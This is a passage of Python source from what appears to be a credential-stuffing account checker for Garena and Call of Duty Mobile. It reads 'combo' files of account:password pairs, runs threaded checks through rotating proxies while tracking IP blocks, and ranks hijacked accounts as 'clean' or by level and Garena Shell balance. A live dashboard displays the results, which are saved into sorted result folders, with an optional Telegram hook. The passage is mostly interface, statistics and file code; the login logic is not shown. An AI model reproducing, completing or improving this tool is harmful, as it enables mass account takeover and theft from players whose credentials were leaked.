    elif len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    else:
        return mobile_str

class AccountFileManager:
    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()
    def scan_combo_folder(self):
        return list(self.combo_folder.glob('*.txt'))
    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {'name': file_path.name, 'path': str(file_path), 'size': file_size, 'size_str': self._format_size(file_size), 'account_count': account_count}
        except Exception as e:
            logger.error(f'Error reading file {file_path}')
            return None
    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f'{size_bytes:.2f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.2f} GB'
    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f'{account}:{password}\n')
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return (len(cleaned_lines), invalid_count)
        except Exception as e:
            logger.error(f'Error cleaning file encoding')
            return (0, 0)
    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception as e:
            logger.error(f'Error cleaning duplicates')
            return 0
    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception as e:
            logger.error(f'Error removing line')
            return False

class AccountFileViewer:
    def __init__(self):
        self.console = Console()
    def display_file_table(self, file_infos):
        table = Table(title="📊  COMBO FILES", title_style="bold cyan", box=box.ROUNDED, border_style="cyan", header_style="bold dim", expand=False, padding=(0, 1))
        table.add_column("#", justify="right", style="cyan", no_wrap=True)
        table.add_column("Filename", style="white", overflow="fold")
        table.add_column("Size", justify="left", style="yellow")
        table.add_column("Accounts", justify="right", style="green")
        table.add_column("Bar", no_wrap=True)
        max_ac = max((i["account_count"] for i in file_infos)) if file_infos else 1
        for idx, info in enumerate(file_infos, 1):
            filled = int(info["account_count"] / max_ac * 16) if max_ac else 0
            bar = Text()
            bar.append("█" * filled, style="cyan")
            bar.append("░" * (16 - filled), style="dim")
            table.add_row(str(idx), info["name"], info["size_str"], f"{info['account_count']:,}", bar)
        self.console.print()
        self.console.print(table)
        self.console.print()
    def prompt_file_selection(self, file_infos):
        self.console.print("  [dim]Enter file number or [cyan]'auto'[/cyan][dim] to pick largest[/dim]\n")
        while True:
            choice = input(f"  {_CY}❯{_RST} ").strip().lower()
            if choice == "auto":
                largest = max(file_infos, key=lambda x: x["account_count"])
                self.console.print(f"  [green]✔[/green] Auto-selected: [white]{largest['name']}[/white]")
                return largest["path"]
            try:
                idx = int(choice)
                if 1 <= idx <= len(file_infos):
                    return file_infos[idx - 1]["path"]
                self.console.print("  [red]✘[/red] Invalid number — try again.")
            except ValueError:
                self.console.print("  [red]✘[/red] Enter a number or 'auto'.")
    def prompt_clean_file(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Clean file encoding?[/white]", default=True)
    def prompt_remove_duplicates(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Remove duplicate lines?[/white]", default=False)
    def prompt_auto_remove_checked(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Auto-remove checked lines?[/white]", default=False)

class LiveStats:
    def __init__(self):
        self.valid_count = self.invalid_count = self.clean_count = self.not_clean_count = 0
        self.has_codm_count = self.no_codm_count = self.error_count = 0
        self.highest_clean_level = self.highest_not_clean_level = self.highest_shell = 0
        self.clean_level_counts = {'351-400':0,'201-350':0,'101-200':0,'1-100':0}
        self.not_clean_level_counts = {'351-400':0,'201-350':0,'101-200':0,'1-100':0}
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        self.game_counts = {k:0 for k,_ in GAME_DISPLAY_NAMES}
        self.last_result_queue = deque(maxlen=200)
    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False, codm_level=0, game_connections=None, shell=0, proxy_rotated=False, skipped_403=False):
        with self.lock:
            if is_error:
                self.error_count += 1
            elif valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                    if codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                    if has_codm and codm_level > 0:
                        if codm_level <= 100:
                            self.clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.clean_level_counts['201-350'] += 1
                        else:
                            self.clean_level_counts['351-400'] += 1
                else:
                    self.not_clean_count += 1
                    if has_codm and codm_level > 0:
                        if codm_level > self.highest_not_clean_level:
                            self.highest_not_clean_level = codm_level
                        if codm_level <= 100:
                            self.not_clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.not_clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.not_clean_level_counts['201-350'] += 1
                        else:
                            self.not_clean_level_counts['351-400'] += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
                try:
                    if int(shell or 0) > self.highest_shell:
                        self.highest_shell = int(shell or 0)
                except:
                    pass
                for g in game_connections or []:
                    gname = g.get('game','').upper()
                    if gname == 'FREE FIRE':
                        gname = 'FREEFIRE'
                    if gname in self.game_counts:
                        self.game_counts[gname] += 1
            else:
                self.invalid_count += 1
    def get_stats(self):
        with self.lock:
            return {'valid':self.valid_count,'invalid':self.invalid_count,'clean':self.clean_count,
                    'not_clean':self.not_clean_count,'has_codm':self.has_codm_count,
                    'no_codm':self.no_codm_count,'error':self.error_count,
                    'highest_clean_level':self.highest_clean_level,
                    'clean_level_counts':dict(self.clean_level_counts),
                    'not_clean_level_counts':dict(self.not_clean_level_counts),
                    'game_counts':dict(self.game_counts),'highest_shell':self.highest_shell,
                    'total':self.valid_count+self.invalid_count+self.error_count}
    def get_processed_count(self):
        with self.lock:
            return self.valid_count + self.invalid_count + self.error_count
    def push_result(self, success: bool, is_clean: bool = False, has_codm: bool = False, codm_level: int = 0, error_reason: str = '', shell_balance: int = 0):
        with self.lock:
            self.last_result_queue.append({'success':success,'is_clean':is_clean,'has_codm':has_codm,'codm_level':codm_level,'error_reason':error_reason,'shell_balance':shell_balance})
    def pop_result(self):
        with self.lock:
            return self.last_result_queue.popleft() if self.last_result_queue else None
    def _rich_bar(self, count: int, denom: int, color: str, width: int = 20) -> Text:
        if denom == 0:
            return Text("░" * width, style="dim")
        filled = int(count / denom * width)
        bar = Text()
        bar.append("█" * filled, style=color)
        bar.append("░" * (width - filled), style="dim")
        return bar
    def _rich_pct(self, count: int, denom: int) -> str:
        return f"{count / denom * 100:.1f}%" if denom > 0 else "0.0%"
    def display_stats(self):
        stats = self.get_stats()
        processed = self.get_processed_count()
        if processed == 0:
            return ''
        elapsed = time.time() - self.start_time
        rate = processed / elapsed if elapsed > 0 else 0
        remaining = self.total_accounts - processed
        eta = remaining / rate if rate > 0 else 0
        pct = processed / self.total_accounts * 100 if self.total_accounts > 0 else 0
        bar_w = 30
        filled = int(pct / 100 * bar_w)
        prog_bar = f"[bright_cyan]{'█' * filled}[/bright_cyan][dim]{'░' * (bar_w - filled)}[/dim]"
        def _mb(count, total, color, w=12):
            if total == 0:
                return f"[dim]{'░' * w}[/dim]"
            f2 = int(count / total * w)
            return f"[{color}]{'█' * f2}{'░' * (w - f2)}[/{color}]"
        tbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        tbl.add_column(style='dim', min_width=6, no_wrap=True)
        tbl.add_column(style='bright_white', min_width=8, no_wrap=True, justify='right')
        tbl.add_column(style='dim', min_width=14, no_wrap=True)
        tbl.add_row(f'[bright_cyan]{prog_bar}[/bright_cyan]', f'[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]', f'[dim]{processed}/{self.total_accounts}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60)}s[/dim]')
        tbl.add_row('', '', '')
        total_c = stats['valid'] + stats['invalid']
        tbl.add_row(f'[bright_green]✔ Valid[/bright_green]', f"[bright_green]{stats['valid']}[/bright_green]", _mb(stats['valid'], total_c, 'bright_green'))
        tbl.add_row(f'[bright_red]✖ Invalid[/bright_red]', f"[bright_red]{stats['invalid']}[/bright_red]", _mb(stats['invalid'], total_c, 'bright_red'))
        tbl.add_row(f'[bright_green]✨ Clean[/bright_green]', f"[bright_green]{stats['clean']}[/bright_green]", _mb(stats['clean'], max(stats['valid'], 1), 'bright_green'))
        tbl.add_row(f'[yellow]⊘ Not Clean[/yellow]', f"[yellow]{stats['not_clean']}[/yellow]", _mb(stats['not_clean'], max(stats['valid'], 1), 'yellow'))
        tbl.add_row(f'[bright_cyan]◈ CODM[/bright_cyan]', f"[bright_cyan]{stats['has_codm']}[/bright_cyan]", _mb(stats['has_codm'], max(stats['valid'], 1), 'bright_cyan'))
        tbl.add_row(f'[dim]○ No CODM[/dim]', f"[dim]{stats['no_codm']}[/dim]", _mb(stats['no_codm'], max(stats['valid'], 1), 'magenta'))
        tbl.add_row('', '', '')
        tbl.add_row(f'[dim]▲ Top Clean Lv[/dim]', f"[bold bright_green]{stats['highest_clean_level']}[/bold bright_green]", '')
        tbl.add_row(f'[dim]▲ Top Not Clean Lv[/dim]', f'[bold yellow]{self.highest_not_clean_level}[/bold yellow]', '')
        hs = stats.get('highest_shell', 0)
        hs_color = 'bold bright_yellow' if hs > 0 else 'dim'
        tbl.add_row(f'[dim]◆ Shell[/dim]', f'[{hs_color}]{hs:,}[/{hs_color}]', '')
        gc = stats.get('game_counts', {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
        if active_games:
            tbl.add_row('', '', '')
            for label, count in active_games:
                tbl.add_row(f'[dim]{label}[/dim]', f'[bold bright_magenta]{count}[/bold bright_magenta]', '')
        return Panel(tbl, title='[bold bright_magenta]◈ [/bold bright_magenta][bold bright_cyan]MITZ CODM LIVE[/bold bright_cyan][bold bright_magenta] ◈[/bold bright_magenta]', border_style='bright_cyan', box=DOUBLE, padding=(0, 2))
    def display_final_stats(self):
        stats = self.get_stats()
        elapsed = time.time() - self.start_time
        total = self.total_accounts
        proc = self.get_processed_count()
        rate = proc / elapsed if elapsed > 0 else 0
        console = Console()
        results_table = Table(title="[bold bright_cyan]◈ SESSION COMPLETE[/bold bright_cyan]", title_style="bold bright_cyan", box=DOUBLE, border_style="bright_cyan", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
        results_table.add_column("Category", style="dim", no_wrap=True, width=14)
        results_table.add_column("Count", justify="right", style="bright_white", width=10)
        results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
        results_table.add_column("Bar", no_wrap=True)
        denom = max(total, 1)
        for label, count, color in [("✔  Valid", stats['valid'], "bright_green"), ("✖  Invalid", stats['invalid'], "bright_red"), ("·  Errors", stats['error'], "dim")]:
            results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{count:,}[/{color}]", self._rich_pct(count, denom), self._rich_bar(count, denom, color, 20))
        results_table.add_row("", "", "", "")
        vd = max(stats['valid'], 1)
        for label, count, color in [("✨  Clean", stats['clean'], "bright_green"), ("⊘  Not Clean", stats['not_clean'], "bright_yellow"), ("◈  Has CODM", stats['has_codm'], "bright_cyan"), ("○  No CODM", stats['no_codm'], "magenta")]:
            results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{count:,}[/{color}]", self._rich_pct(count, vd), self._rich_bar(count, vd, color, 20))
        console.print(Panel(results_table, border_style="bright_cyan", box=HEAVY, padding=(0, 1)))
        stats_table = Table(title="[bold bright_yellow]◈ SESSION STATS[/bold bright_yellow]", box=ROUNDED, border_style="bright_yellow", show_header=False, padding=(0, 2), expand=False)
        stats_table.add_column(style="dim", width=16, no_wrap=True)
        stats_table.add_column(style="bright_white", no_wrap=True)
        hs = stats.get('highest_shell', 0)
        hs_style = "bold bright_yellow" if hs > 0 else "dim"
        clean_lvl_style = "bold bright_green" if stats['highest_clean_level'] > 0 else "dim"
        not_clean_lvl_style = "bold bright_yellow" if self.highest_not_clean_level > 0 else "dim"
        for label, val in [("⏱  Time", f"{int(elapsed // 60)}m {int(elapsed % 60)}s"), ("⚡  Rate", f"{rate:.2f} acc/s"), ("◈  Processed", f"{proc:,}/{total:,}"), ("▲  Top Clean", f"[{clean_lvl_style}]{stats['highest_clean_level']}[/{clean_lvl_style}]"), ("▲  Top Not Clean", f"[{not_clean_lvl_style}]{self.highest_not_clean_level}[/{not_clean_lvl_style}]"), ("◆  Peak Shell", f"[{hs_style}]{hs:,}[/{hs_style}]")]:
            stats_table.add_row(label, val)
        level_table = Table(title="[bold bright_magenta]◈ LEVEL RANGES[/bold bright_magenta]", box=ROUNDED, border_style="bright_magenta", show_header=True, header_style="bold dim", padding=(0, 1), expand=False)
        level_table.add_column("Range", style="dim", no_wrap=True, width=10)
        level_table.add_column("Clean", justify="right", style="bright_green", width=8)
        level_table.add_column("Bar", no_wrap=True)
        level_table.add_column("Not Clean", justify="right", style="bright_yellow", width=8)
        level_table.add_column("Bar", no_wrap=True)
        clean_lvl = stats['clean_level_counts']
        not_clean_lvl = stats['not_clean_level_counts']
        ct = max(stats['clean'], 1)
        nt = max(stats['not_clean'], 1)
        for rng in ['351-400', '201-350', '101-200', '1-100']:
            cc = clean_lvl.get(rng, 0)
            nc = not_clean_lvl.get(rng, 0)
            level_table.add_row(f"[dim]Lv {rng}[/dim]", f"{cc:,}", self._rich_bar(cc, ct, "bright_green", 12), f"{nc:,}", self._rich_bar(nc, nt, "bright_yellow", 12))
        stats_levels = Columns([stats_table, level_table], expand=False, equal=False, padding=(0, 2))
        console.print(Panel(stats_levels, border_style="bright_yellow", box=ROUNDED, padding=(0, 1)))
        gc = stats.get('game_counts', {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
        if active_games:
            games_table = Table(title="[bold bright_cyan]◈ GAMES FOUND[/bold bright_cyan]", box=ROUNDED, border_style="bright_cyan", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
            games_table.add_column("Game", style="dim", no_wrap=True, width=24)
            games_table.add_column("Count", justify="right", style="bright_white", width=8)
            games_table.add_column("Bar", no_wrap=True)
            peak = max(c for _, c in active_games) or 1
            for label, count in active_games:
                games_table.add_row(f"[dim]{label}[/dim]", f"[bright_cyan]{count:,}[/bright_cyan]", self._rich_bar(count, peak, "bright_cyan", 16))
            console.print(Panel(games_table, border_style="bright_cyan", box=ROUNDED, padding=(0, 1)))
        footer_text = Text()
        footer_text.append("⬡  Powered by @mitzgaspari", style="magenta bold")
        console.print(Panel(Align.center(footer_text), border_style="magenta", box=ROUNDED, padding=(0, 1)))
        console.print()

class BulkLiveDashboard:
    MAX_RECENT = 100
    def __init__(self, total_accounts: int, max_threads: int = 1):
        self.total = total_accounts
        self.done = self.valid = self.invalid = 0
        self.clean = self.not_clean = 0
        self.codm_present = self.no_codm = 0
        self.lvl_1_100 = self.lvl_101_200 = self.lvl_201_300 = self.lvl_350_400 = 0
        self.highest_shell_balance = 0
        self.highest_clean_level = 0
        self.start_time = time.time()
        self.ip_blocked = False
        self.cooldown_until = 0.0
        self.active_threads = self.max_threads = max_threads
        self.ramp_mode = False
        self.high_hits = deque(maxlen=10)
        self.recent = deque(maxlen=self.MAX_RECENT)
        self.current_proxy = None
        self.current_proxy_line = None
        self._lock = Lock()
        self._spinner_frames = '⣾⣽⣻⢿⡿⣟⣯⣷'
        self._tick = 0
        self._dirty = True
        self._live = None
        self._stop_event = Event()
        self._render_thread = None
        self._typing_target = None
        self._typing_started = 0.0
    def set_current_proxy(self, proxy: str = None, line: int = None):
        with self._lock:
            if proxy:
                self.current_proxy = proxy
            if line is not None:
                self.current_proxy_line = line
            self._dirty = True
    def record(self, index: int, account: str, success: bool, is_clean: bool = False,
               has_codm: bool = False, codm_level: int = 0, shell_balance: int = 0, error_reason: str = ''):
        with self._lock:
            self.done += 1
            n = self.done
            if success:
                self.valid += 1
                if is_clean:
                    self.clean += 1
                else:
                    self.not_clean += 1
                if shell_balance > self.highest_shell_balance:
                    self.highest_shell_balance = shell_balance
                if is_clean and codm_level > self.highest_clean_level:
                    self.highest_clean_level = codm_level
                if has_codm:
                    self.codm_present += 1
                    if codm_level <= 100:
                        self.lvl_1_100 += 1
                    elif codm_level <= 200:
                        self.lvl_101_200 += 1
                    elif codm_level <= 300:
                        self.lvl_201_300 += 1
                    else:
                        self.lvl_350_400 += 1
                    if codm_level >= 100:
                        self.high_hits.appendleft((codm_level, account, is_clean))
                    tag = '[bold green]CLEAN[/bold green]' if is_clean else '[bold yellow]NOT CLEAN[/bold yellow]'
                    detail = f'  [dim]LVL {codm_level}[/dim]' if codm_level else ''
                    line = f'[dim]{n:>4}[/dim]  [green]✓[/green]  [cyan]{account}[/cyan]  {tag}{detail}'
                else:
                    self.no_codm += 1
                    tag = '[bold magenta]NO CODM[/bold magenta] [dim](clean)[/dim]' if is_clean else '[bold magenta]NO CODM[/bold magenta] [dim](not clean)[/dim]'
                    line = f'[dim]{n:>4}[/dim]  [green]✓[/green]  [cyan]{account}[/cyan]  {tag}'
            else:
                self.invalid += 1
                line = f'[dim]{n:>4}[/dim]  [red]✗[/red]  [dim]{account}[/dim]  [red]{error_reason or "Invalid"}[/red]'
            self.recent.append(line)
            self._typing_target = line
            self._typing_started = time.monotonic()
            self._dirty = True
    def set_ip_blocked(self, blocked: bool):
        with self._lock:
            self.ip_blocked = blocked
            self._dirty = True
    def set_cooldown(self, seconds: float):
        with self._lock:
            self.cooldown_until = time.time() + seconds if seconds > 0 else 0.0
            self._dirty = True
    def set_active_threads(self, n: int, ramp_mode: bool = False):
        with self._lock:
            self.active_threads = n
            self.ramp_mode = ramp_mode
            self._dirty = True
    def _render(self) -> Panel:
        with self._lock:
            done, total = self.done, self.total
            valid, invalid = self.valid, self.invalid
            clean, not_clean = self.clean, self.not_clean
            codm_p, no_codm = self.codm_present, self.no_codm
            ip_blocked = self.ip_blocked
            cooldown_left = max(0.0, self.cooldown_until - time.time())
            active, max_thr = self.active_threads, self.max_threads
            l1, l2, l3, l4 = self.lvl_1_100, self.lvl_101_200, self.lvl_201_300, self.lvl_350_400
            hs, hc = self.highest_shell_balance, self.highest_clean_level
            high_hits = list(self.high_hits)
            recent = list(self.recent)
            elapsed = time.time() - self.start_time
            self._tick = (self._tick + 1) % len(self._spinner_frames)
            spinner = self._spinner_frames[self._tick]
            typing_target = self._typing_target
            typing_progress = 0
            typing_active = False
            if typing_target:
                target_text = Text.from_markup(typing_target)
                target_length = len(target_text.plain)
                typing_progress = min(
                    target_length,
                    max(0, int((time.monotonic() - self._typing_started) * 28)),
                )
                typing_active = typing_progress < target_length
            proxy_display = self.current_proxy or 'None'
            if self.current_proxy_line is not None:
                proxy_info = f'[dim]Proxy [{self.current_proxy_line}]:[/dim] [cyan]{proxy_display[:40]}[/cyan]'
            else:
                proxy_info = f'[dim]Proxy:[/dim] [cyan]{proxy_display[:40]}[/cyan]'
        pct = done / total * 100 if total else 0
        rate = done / elapsed if elapsed > 0 else 0
        e_str = f'{int(elapsed//3600)}:{int(elapsed%3600//60):02d}:{int(elapsed%60):02d}'
        pc = 'bright_red' if ip_blocked else 'bright_magenta'
        live_console = self._live.console if self._live else Console()
        console_width = live_console.width
        console_height = live_console.height
        compact = console_width < 88
        bw = max(24, min(46, console_width - 18))
        filled = int(pct / 100 * bw)
        bar = f'[{pc}]{"█"*filled}[/{pc}][dim]{"░"*(bw-filled)}[/dim]'
        tc = 'bright_green' if active == max_thr else 'bright_yellow'
        ip_color = 'bright_red' if ip_blocked else 'bright_green'
        ip_label = f'⚠ IP BLOCKED · {cooldown_left:.0f}s' if ip_blocked and cooldown_left > 0 else '⚠ IP BLOCKED' if ip_blocked else '● IP CLEAR'
        def metric(label: str, value, color: str):
            cell = Table.grid(padding=(0, 1))
            cell.add_column(no_wrap=True)
            cell.add_row(Text(label, style='dim'))
            cell.add_row(Text(str(value), style=color))
            return cell
        def section_title(label: str, color: str = 'bright_cyan'):
            return Rule(Text(f' {label.upper()} ', style=f'bold {color}'), style='grey30')
        header = Table.grid(expand=True, padding=(0, 1))
        header.add_column(ratio=2, no_wrap=True)
        header.add_column(ratio=1, justify='center', no_wrap=True)
        header.add_column(ratio=2, justify='right', no_wrap=True)
        header.add_row(
            Text.from_markup('[bold bright_white]MITZ[/bold bright_white] [bold bright_magenta]//[/bold bright_magenta] [bright_magenta]LIVE OPS[/bright_magenta]'),
            Text.from_markup(f'[bright_magenta]{spinner}[/bright_magenta] [dim]SCANNING[/dim]'),
            Text.from_markup(f'[dim]UPTIME[/dim] [bold bright_white]{e_str}[/bold bright_white]')
        )
        status = Table.grid(expand=True, padding=(0, 2))
        status.add_column(ratio=1, no_wrap=True)
        status.add_column(ratio=1, no_wrap=True)
        status.add_column(ratio=2, no_wrap=True)
        status.add_column(ratio=2, justify='right', no_wrap=True)
        status.add_row(
            Text.from_markup(f'[dim]THREADS[/dim] [{tc}]{active}/{max_thr}[/{tc}]'),
            Text.from_markup(f'[dim]STATUS[/dim] [{ip_color}]{ip_label}[/{ip_color}]'),
            Text.from_markup(proxy_info),
            Text.from_markup(f'[dim]RATE[/dim] [bold bright_yellow]{rate:.1f}/s[/bold bright_yellow]')
        )
        progress = Table.grid(expand=True, padding=(0, 1))
        progress.add_column(no_wrap=True)
        progress.add_row(Text.from_markup(
            f'[bright_cyan]{bar}[/bright_cyan]  [bold bright_yellow]{pct:.1f}%[/bold bright_yellow] '
            f'[dim]{done:,}/{total:,} processed[/dim]'
        ))
        primary = Table.grid(expand=True, padding=(0, 2))
        primary_columns = 2 if compact else 4
        for _ in range(primary_columns):
            primary.add_column(ratio=1)
        primary_metrics = [
            metric('PROCESSED', f'{done:,}', 'bold bright_white'),
            metric('VALID', f'{valid:,}', 'bold bright_green'),
            metric('CLEAN', f'{clean:,}', 'bold bright_green'),
            metric('CODM', f'{codm_p:,}', 'bold bright_magenta'),
            metric('INVALID', f'{invalid:,}', 'bold bright_red'),
            metric('NOT CLEAN', f'{not_clean:,}', 'bold bright_yellow'),
            metric('NO CODM', f'{no_codm:,}', 'dim'),
            metric('PEAK SHELL', f'{hs:,}' if hs else '—', 'bold bright_yellow'),
        ]
        for row_start in range(0, len(primary_metrics), primary_columns):
            primary.add_row(*primary_metrics[row_start:row_start + primary_columns])
        levels = Table.grid(expand=True, padding=(0, 2))
        level_columns = 2 if compact else 4
        for _ in range(level_columns):
            levels.add_column(ratio=1, no_wrap=True)
        level_metrics = [
            Text.from_markup(f'[dim]LV 1–100[/dim]  [white]{l1:,}[/white]'),
            Text.from_markup(f'[dim]LV 101–200[/dim]  [bright_cyan]{l2:,}[/bright_cyan]'),
            Text.from_markup(f'[dim]LV 201–300[/dim]  [bold bright_cyan]{l3:,}[/bold bright_cyan]'),
            Text.from_markup(f'[dim]LV 350–400[/dim]  [bold bright_yellow]{l4:,}[/bold bright_yellow]'),
        ]
        for row_start in range(0, len(level_metrics), level_columns):
            levels.add_row(*level_metrics[row_start:row_start + level_columns])
        hits = Table.grid(expand=True, padding=(0, 1))
        hits.add_column(width=7, no_wrap=True)
        hits.add_column(ratio=1, no_wrap=True)
        if high_hits:
            for lvl, acc, is_clean in high_hits[:6]:
                color = 'bold bright_green' if is_clean else 'bold bright_yellow'
                short_acc = acc if len(acc) <= 34 else acc[:32] + '…'
                hits.add_row(Text(f'LV {lvl}', style=color), Text(short_acc, style='dim'))
        else:
            hits.add_row(Text('—', style='dim'), Text('No high-level hits yet', style='dim'))
        log = Table.grid(expand=True, padding=(0, 1))
        log.add_column(no_wrap=True)
        reserved_rows = 20 if compact else 16
        log_limit = max(18, console_height - reserved_rows)
        visible_recent = list(recent)[-log_limit:] if recent else ['[dim]Waiting for results…[/dim]']
        for line_index, line in enumerate(visible_recent):
            is_typing = (
                typing_target
                and line_index == len(visible_recent) - 1
                and line == typing_target
                and typing_active
            )
            if is_typing:
                typed_line = Text.from_markup(line)
                typed_line.truncate(typing_progress, overflow='crop')
                cursor = '█' if self._tick % 2 == 0 else '▌'
                typed_line.append(cursor, style='bold bright_magenta')
                log.add_row(typed_line)
            else:
                log.add_row(Text.from_markup(line))
        activity = Table.grid(expand=True, padding=(0, 2))
        if compact:
            activity.add_column(ratio=1)
            activity.add_row(hits)
            activity.add_row(log)
        else:
            activity.add_column(ratio=1)
            activity.add_column(ratio=2)
            activity.add_row(hits, log)
        blade = Text.from_markup(
            '[bold bright_magenta]╺━[/bold bright_magenta] '
            '[bold bright_white]//[/bold bright_white] '
            '[bold {color}]{label}[/bold {color}] '
            '[dim]╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/dim]'.format(
                color='bright_cyan',
                label='RUN STATUS',
            )
        )
        signal_blade = Text.from_markup(
            '[bold bright_magenta]╺━[/bold bright_magenta] '
            '[bold bright_white]//[/bold bright_white] '
            '[bold bright_magenta]SIGNAL[/bold bright_magenta] '
            '[dim]╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/dim]'
        )
        activity_blade = Text.from_markup(
            '[bold bright_yellow]╺━[/bold bright_yellow] '
            '[bold bright_white]//[/bold bright_white] '
            '[bold bright_yellow]ACTIVITY / LIVE FEED[/bold bright_yellow] '
            '[dim]╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/dim]'
        )
        progress_blade = Text.from_markup(
            '[bold bright_cyan]╺━[/bold bright_cyan] '
            '[bold bright_white]//[/bold bright_white] '
            '[bold bright_cyan]PROGRESS[/bold bright_cyan] '
            '[dim]╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/dim]'
        )
        return Panel(
            Group(
                header,
                blade,
                status,
                progress_blade,
                progress,
                signal_blade,
                primary,
                levels,
                activity_blade,
                activity,
            ),
            title='[bold bright_white] MIITZ [/bold bright_white][bold bright_magenta]//[/bold bright_magenta][bold bright_cyan] LIVE OPS [/bold bright_cyan]',
            title_align='left',
            border_style='bright_red' if ip_blocked else 'bright_magenta',
            box=box.SIMPLE,
            padding=(0, 1),
            expand=True,
            height=max(1, console_height - 1),
        )
    def start(self):
        self._stop_event.clear()
        self._live = Live(console=Console(), refresh_per_second=30, screen=True)
        self._live.start()
        self._render_thread = threading.Thread(target=self._render_loop, daemon=True)
        self._render_thread.start()
    def _render_loop(self):
        while not self._stop_event.is_set():
            self._live.update(self._render())
            with self._lock:
                self._dirty = False
            time.sleep(0.033)
    def stop(self):
        self._stop_event.set()
        if self._render_thread:
            self._render_thread.join(timeout=0.5)
        if self._live:
            self._live.stop()
    def render(self) -> Panel:
        return self._render()

class ResultsManager:
    def __init__(self, combo_file_path, create_dirs=True, tg_hook=None):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/{self.combo_file_name}_{self.timestamp}')
        if create_dirs:
            for sub in ('Country', 'Level', 'Garena Shells'):
                (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
            if CHECK_OTHER_GAMES:
                (self.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()
        self._tg_hook = tg_hook
    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]
    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter
    @staticmethod
    def _entry_level(entry):
        import re as _re
        m = _re.search('Account Level:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0
    @staticmethod
    def _entry_shell(entry):
        import re as _re
        m = _re.search('Garena Shell:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0
    def _write_sorted(self, filepath, new_entry_body, sort_by='level'):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with self._get_flock(filepath):
            entries = []
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                raw_entries = content.strip().split('\n' + '-' * 60 + '\n')
                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()
                    if raw_entry:
                        if raw_entry.startswith('-' * 60):
                            raw_entry = raw_entry[len('-' * 60):].strip()
                        if raw_entry.endswith('-' * 60):
                            raw_entry = raw_entry[:-len('-' * 60)].strip()
                        entries.append(raw_entry)
            new_entry = new_entry_body.strip()
            if new_entry.startswith('-' * 60):
